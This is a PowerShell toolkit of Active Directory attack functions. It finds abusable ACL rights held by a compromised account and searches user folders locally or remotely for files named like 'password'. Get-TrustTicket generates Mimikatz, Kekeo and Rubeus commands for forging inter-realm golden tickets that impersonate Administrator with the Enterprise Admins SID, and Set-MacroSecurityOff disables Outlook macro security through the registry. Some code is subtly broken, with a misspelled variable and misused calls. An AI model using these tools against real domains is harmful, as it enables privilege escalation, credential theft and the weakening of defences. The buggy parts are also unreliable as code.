function ConvertFrom-ObjectSid{
    <#
    .SYNOPSIS
    Converts Active Directory Security Identifier (SID) to object name or searches for objects in Active Directory based on SID.
    
    .DESCRIPTION
    ConvertFrom-ObjectSid, translates an Active Directory Security Identifier (SID) to the corresponding object name. The SID represents a security context for a user, group, or computer in an Active Directory environment.

    In search mode, the function searches for objects in Active Directory that have the specified SID.

    Credits to Windows OS Hub: https://woshub.com/convert-sid-to-username-and-vice-versa/
    
    .PARAMETER SID
    Specifies the Security Identifier (SID) to be translated. Currently only supports  This parameter is mandatory.
    
    .PARAMETER Domain
    Specifies the domain that owns the specified SID. Default is the user's domain ($env:USERDOMAIN).
    
    .PARAMETER Search
    Switch parameter to enable search mode. If specified, the function searches for objects in Active Directory with the specified SID and Domain. Outputs the object's name + distinguished name to avoid confusion.
    
    .EXAMPLE
    ConvertFrom-ObjectSid -SID "S-1-5-21-3623811015-3361044348-30300844-1013"

    This example converts the specified SID to its corresponding object name.
    
    .EXAMPLE
    ConvertFrom-ObjectSid -SID "S-1-5-21-3623811015-3361044348-30300820-1013" -Domain "OtherDomain" -Search

    This example searches for objects in Active Directory with the specified SID in the "OtherDomain" domain.
    
    .NOTES
    File: ConvertFrom-ObjectSid.ps1
    Author: Rafael Pimentel @gustanini
    Version: 1.0
    Date: Nov 26 2023

    Note: This function's search mode has a dependency on the Active Directory module. Ensure that the module is installed and available before using this function.
    #>  

    [CmdletBinding()]
    param (
        [parameter(Mandatory = $true)]
        [Alias("SID")]
        [string]$SecurityIdentifier,

        [switch]$Search,
        [string]$Domain = $env:USERDOMAIN
    )

    # search mode uses ad-module to find an object with the specified SID
    if ($Search) {
        Get-ADObject -Filter {objectSID -eq "$SecurityIdentifier"} -Server $Domain |
            Select-Object Name, DistinguishedName | 
                Format-List
    }
    # normal mode uses System.Security.Principal.SecurityIdentifier to translate the specified SID
    else {
    # Translate SID
    $objSID = New-Object System.Security.Principal.SecurityIdentifier ($SecurityIdentifier)
    $Object = $objSID.Translate($SecurityIdentifier)

    $Object.Value
    }
}
function Find-ADInterestingACL {
    <#
    .SYNOPSIS
    Finds and lists all Active Directory Objects' Access Control Lists (in the current domain) filtering by interesting rights and provided identities.

    Author: Rafael Pimentel (@gustanini)
    Required Dependency: Active Directory Module

    .DESCRIPTION
    The Find-ADInterestingACL function searches Active Directory objects and filters their Access Control Lists (ACLs) based on specified rights and identity parameters. It enumerates all AD objects, retrieves their ACLs, and then filters these ACLs to find specific permissions related to the provided identities.

    .PARAMETER Rights
    Specifies the types of rights to filter for in the ACLs. The default values are 'write|all|force|self' to ensure that only exploitable rights are displayed. This parameter accepts a string that represents a regular expression pattern to match against the Active Directory rights.

    .PARAMETER Identity
    Specifies the identity to filter for in the ACLs. Think of it as the already compromised user you want to check. This is a mandatory parameter. The function will match this parameter value against the IdentityReference property of ACL entries.

    .PARAMETER Domain
    Specifies the domain to be used for the retrieval of Active Directory objects and their Access Control Lists (ACLs). If this parameter is not provided, the function operates in the current domain context.

    .EXAMPLE
    PS C:\> Find-ADInterestingACL -Identity 'CompromisedUser|CompromisedGroup'
    This example finds and lists all AD objects where the ACLs includes exploitable rights for 'CompromisedUser' and 'CompromisedGroup'.

    .EXAMPLE
    PS C:\> Find-ADInterestingACL -Rights 'write|modify' -Identity 'JohnDoe'
    This example finds and lists all AD objects where the ACLs include 'write' or 'modify' rights for the user 'JohnDoe'.

    .INPUTS
    None. You cannot pipe objects to Find-ADInterestingACL.

    .OUTPUTS
    The function outputs a formatted list of AD objects with specific ACL entries matching the given criteria. Each entry includes the target distinguished name, rights, access control type, and identity reference.

    .NOTES
    This function requires the Active Directory module for PowerShell. Ensure that the Microsoft Active Directory Module is installed and available in your PowerShell session. This module is typically available on systems that have the Active Directory Domain Services (AD DS) role installed, or by installing the Remote Server Administration Tools (RSAT) package.

    .LINK
    https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-adobject
    #>
    # params        
    [CmdletBinding()]
    param (
        [string]$Rights = 'write|all|force|self',
        [Parameter(Mandatory = $true)]
        [string]$Identity,
        [string]$Domain
    )

    # Create PSDrive for the specified domain
    if ($Domain) {
        New-PSDrive -Name AD2 -PSProvider ActiveDirectory -Server $Domain -Root "//RootDSE/"
        $ADPathPrefix = "AD2:\"
    } else {
        # if no domain specified, use the domain of the current session
        $Domain = (Get-AdDomain).DnsRoot
        $ADPathPrefix = "AD:\"
    }

    # Save all AD objects as DN for get-acl
    (Get-ADObject -Filter * -Server $Domain).DistinguishedName | ForEach-Object {
        $acl = (Get-Acl -Path ("$ADPathPrefix$_") -Filter *)

        # filter using rights and identity
        $acl.Access | Where-Object {
            $_.ActiveDirectoryRights -match $Rights -and
            $_.IdentityReference -match $Identity
        } | Select-Object @{
            Name = 'TargetDN'
            Expression = {$acl.PSPath -replace '.*DSE\/', ''}
        }, ActiveDirectoryRights, AccessControlType, IdentityReference
    } | Format-List

    # Remove PSDrive if it was created
    if ($ADPathPrefix -eq "AD2:\") {
        Remove-PSDrive -Name AD2
    }
}
function Find-File {
    <#
    .SYNOPSIS
    Searches for files containing a specified string in a specified path on a local or remote computer.

    .DESCRIPTION
    The Find-File function performs a search for files that contain a specified string within their names. It supports searching on the local machine or a remote computer using either HTTP access or CIFS access. If searching on a remote computer, ensure that the appropriate access is available.

    .PARAMETER searchString
    Specifies the string to search for within file names. The default value is "password".

    .PARAMETER Path
    Specifies the path to start the search. The default is "C:\Users\".

    .PARAMETER computerName
    Specifies the name of the remote computer to search. If provided, the function performs a remote query using either HTTP access or CIFS access.

    .PARAMETER Cifs
    Switch parameter that indicates whether to use CIFS access for the remote query. If specified, the function uses CIFS access and expects the $Path parameter to be specified using the drivename$ syntax.

    .EXAMPLE
    Find-File -searchString "pass" -Path "c$\Users" -computerName "RemoteComputer" -Cifs

    This example searches for files with names that match the string "pass" in the "C:\Users" directory on the remote computer "RemoteComputer" leveraging CIFS access.

    .EXAMPLE
    Find-File -searchString "confidential" -Path "C:\Documents"

    This example searches for files containing the string "confidential" in the "C:\Documents" directory on the local machine.

    .NOTES
    File: Find-File.ps1
    Author: [Your Name]
    Version: 1.0
    Date: [Current Date]
    #>
    [CmdletBinding()]
    param(
        [string]$searchString = "password",
        [string]$Path = "C:\Users\",
        [string]$computerName,

        [switch]$Cifs
    )

    # Message
    Write-Host "Finding files containing string $searchString in $computerName $Path" -ForegroundColor Cyan

    # perform remote query if computer is specified (need HTTP access)
    if ($computername) {
        Invoke-Command -ComputerName $computerName -ScriptBlock {
                Get-ChildItem -Path $Path -File -Recurse | 
                    Where-Object {$_.Name -match "$searchString"} -ErrorAction SilentlyContinue | 
                        Select-Object Directory, Name | 
                            Write-Host -ForegroundColor Green
            }
    }
    
    # perform remote query leveraging cifs access only (specify path using drivename$ syntax)
    elseif ($Cifs){
        Get-ChildItem -Path "\\$computerName\$Path" -File -Recurse | 
            Where-Object {$_.Name -match "$searchString"} -ErrorAction SilentlyContinue | 
                Select-Object Directory, Name | 
                    Write-Host -ForegroundColor Green
    }

    # perform localhost query
    else {
        Get-ChildItem -Path $Path -File -Recurse | 
            Where-Object {$_.Name -match "$searchString"} -ErrorAction SilentlyContinue | 
                Select-Object Directory, Name | 
                    Write-Host -ForegroundColor Green
    }
}
function Get-NestedGroupMembership {
    <#
    .SYNOPSIS
    Recursively retrieves nested group memberships for a specified user account.

    .DESCRIPTION
    This function, Get-NestedGroupMembership, uses the Active Directory module to recursively retrieve nested group memberships for a specified user account. It starts by querying the direct group memberships and then recursively retrieves nested memberships.

    .PARAMETER SamAccountName
    Specifies the SamAccountName of the user for whom nested group memberships are to be retrieved.

    .EXAMPLE
    Get-NestedGroupMembership -SamAccountName "JohnDoe"
    This example retrieves nested group memberships for the user with the SamAccountName "JohnDoe".

    .NOTES
    File: Get-NestedGroupMembership.ps1
    Author: Rafael Pimentel @gustanini
    Version: 1.0
    Date: Nov 27 2023
    #>

    [CmdletBinding()]
    param (
        [parameter(Mandatory = $true)]
        [string]$SamAccountName
    )

    # Retrieve direct group memberships
    $groups = @(
        Get-ADPrincipalGroupMembership -Identity $SamAccountName | 
            Select-Object -ExpandProperty DistinguishedName
        )

    # Output direct group memberships
    $groups

    # Recursively retrieve nested group memberships
    if ($groups.Count -gt 0) {
        foreach ($group in $groups) {
            Get-NestedGroupMembership -SamAccountName $group
        }
    }
}
function Get-TrustTicket{
    <#
    .SYNOPSIS
    Generate command needed for the crafting of inter-realm TGTs (trust attacks) and TGS for Mimikatz, Kekeo and Rubeus.
    
    Author: Rafael Pimentel (@gustanini)
    Required Dependency: Active Directory Module

    .DESCRIPTION
    This script generates the command required for crafting inter-realm/referral TGTs and subsequent TGS for Mimikatz, Kekeo and Rubeus.

    .PARAMETER targetDomain
    The target domain for which the golden ticket will be crafted. This is a mandatory parameter.

    .PARAMETER trustKey
    The trust key (RC4) to be used for forging the golden ticket. This is a mandatory parameter.

    .PARAMETER Service
    The Kerberos service principal name (SPN) for which the ticket is requested. Default is "krbtgt".

    .PARAMETER Domain
    The current domain. Default is the current domain obtained using Get-ADDomain.

    .PARAMETER User
    The user account to be impersonated. Default is "Administrator".

    .PARAMETER Outfile
    The path to save the generated golden ticket file. Default is "C:\Temp\$Domain-$TargetDomain.kirbi".

    .PARAMETER targetGroup
    The target group whose SID will be included in the golden ticket. Default is "Enterprise Admins".
    
    .PARAMETER targetService
    The target service that will be included in the TGS SPN. Default is "CIFS".

    .PARAMETER targetComputer
    The target computer that will be included in the TGS SPN. If not specified, the foreign domain controller will be the target computer.

    .EXAMPLE
    Get-TrustTicket -targetDomain "gustanini.local" -trustKey "C286A0D9DF4137DE792B74317F54D1A1"
    Calculates the flags for crafting a golden ticket for the specified target domain and trust key.

    .NOTES
    This function requires the Active Directory module for PowerShell. Ensure that the Microsoft Active Directory Module is installed and available in your PowerShell session. This module is typically available on systems that have the Active Directory Domain Services (AD DS) role installed, or by installing the Remote Server Administration Tools (RSAT) package.
    .LINK
    https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-adobject
    #>
    # params
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$targetDomain,
        [Parameter(Mandatory = $true)]
        [string]$trustKey,
        [string]$Service = "krbtgt",
        [string]$Domain = (Get-ADDomain).DnsRoot,
        [string]$User = "Administrator",
        [string]$Outfile = "C:\Temp\$Domain-$TargetDomain.kirbi",
        [string]$targetGroup = "Enterprise Admins",
        [string]$tgsService = "CIFS",
        [string]$targetComputer 
    )
    # get domain SID
    $SID = (Get-ADDomain -Identity $Domain).DomainSID.Value
    # get target group SID
    $TargetGroupSID = (Get-ADGroup -Server $TargetDomain -Filter {Name -eq $TargetGroup}).SID.Value
    # get target domain controller
    $targetDC = (Get-ADDomainController -Server $targetDomain).HostName

    # get target computer for TGS
    if (-not $targetComputer){
        $targetComputer = $targetDC
    }

    # generate commands
    $mimiTGT = "kerberos::golden /service:$Service /user:$User /domain:$Domain /sid:$SID /rc4:$trustKey /target:$targetDomain /sids:$TargetGroupSID /ticket:$Outfile"
    $kekeoTGS = "tgs::ask /tgt:$Outfile /service:$tgsService/$targetComputer"

    $rubeusTGT = "Rubeus.exe silver /sids:$TargetGroupSID /target:$targetDomain /rc4:$trustKey /sid:$SID /domain:$Domain /user:$User /service:$Service/$targetDomain /ldap /nowrap"
    $rubeusTGS = "Rubeus.exe asktgs /ticket:B64_TGT /service:$tgsServie/$targetComputer /dc:$targetDC /nowrap /ptt"

    Write-Host `n"Printing: Mimikatz TGT command" `n -ForegroundColor Yellow 
    Write-Host $mimiTGT `n
    Write-Host "Printing: Kekeo TGS command" `n -ForegroundColor Green
    Write-Host $kekeoTGS `n

    Write-Host "Printing: Rubeus TGT command" `n -ForegroundColor Yellow
    Write-Host $rubeusTGT `n
    Write-Host "Printing: Rubeus TGS command" `n -ForegroundColor Green 
    Write-Host $rubeusTGS `n
}
function Set-MacroSecurityOff {
    <#
    .SYNOPSIS
    Disables macro security by editing the registry, if it is enabled.

    .DESCRIPTION
    The Set-MacroSecurityOff function disables macro security by modifying the registry. It checks if the specified registry key exists and, if present, sets the "level" value to 4, representing "No security check." If the key does not exist, the user is prompted to find the correct key path using Set-MacroSecurityKeyOff -Key <Key_Path>. The current value is printed to the screen before changing to facilitate cleanup.

    .PARAMETER SecurityKey
    Specifies the registry key path where the macro security setting is configured. The default is 'HKCU:\Software\Policies\Microsoft\Office\16.0\outlook\security'.

    .EXAMPLE
    Set-MacroSecurityOff -SecurityKey 'HKCU:\Software\Policies\Microsoft\Office\16.0\outlook\security'

    This example disables macro security for Microsoft Office Outlook by setting the "level" value to 4 in the specified registry key path.

    .NOTES
    File: Set-MacroSecurityOff.ps1
    Author: Rafael Pimentel
    Version: 1.0
    Date: 27 Nov 2023
    #>

    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $false, ParameterSetName = "Key")]
        [string]$SecurityKey = 'HKCU:\Software\Policies\Microsoft\Office\16.0\outlook\security'
    )

    # first print current security level (for cleanup later)
    Write-Host "The current macro security level is:" (Get-ItemProperty $SecurityKey).level

    # test if key exists
    if (Test-Path $SecurityKey) {
        # check key value
        if ((Get-ItemProperty $SecurityKey).level -ne 4) {
            Set-ItemProperty -Path $SecurityKey -Name level -Value 4
            Write-Host -ForegroundColor Green 'Value set to "No security Check" (4)'
        }
        # security is already off
        else {
            Write-Host -ForegroundColor Green 'Macro security is already set to "No security check" (4).'
        }
    }
    # key does not exist
    else {
        Write-Host -ForegroundColor Red "Key does not exist at this location: $SecurityKey, find key path and select it using Set-MacroSecurityKeyOff -Key <Key_Path>."
    }
}
